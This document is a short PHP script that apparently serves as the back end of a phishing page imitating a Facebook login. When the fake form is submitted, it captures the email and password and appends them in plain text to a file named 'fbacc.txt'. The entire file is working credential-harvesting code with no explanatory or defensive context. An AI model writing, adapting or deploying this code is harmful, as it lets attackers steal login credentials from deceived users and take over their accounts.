<?php
if(isset($_POST['logg']))
{
$email=$_POST['email'];
$pword=$_POST['pass'];
$filename=fopen("fbacc.txt","a") or die ("Error!");
fwrite($filename,"email:");
fwrite($filename,$email. "\n");
fwrite($filename,"password:");
fwrite($filename,$pword ."\n");
fclose($filename);
}
?>